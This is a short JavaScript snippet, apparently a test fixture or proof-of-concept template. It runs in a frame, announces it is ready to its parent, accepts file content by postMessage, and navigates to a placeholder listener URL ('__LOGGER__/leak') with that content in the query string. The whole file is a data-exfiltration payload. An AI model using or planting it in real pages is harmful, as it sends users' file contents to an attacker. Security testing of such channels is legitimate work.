// Waits for the file it was given, then replaces its own frame with a page on
// the listener, carrying the file's text in the address. Then, if it is still
// being talked to, it says ready again to be handed the next thing.
window.addEventListener('message', function (e) {
  if (e.data && e.data.type === 'init') {
    location.href = '__LOGGER__/leak?d=' + encodeURIComponent(e.data.content);
  }
});
parent.postMessage({ type: 'ready' }, '*');
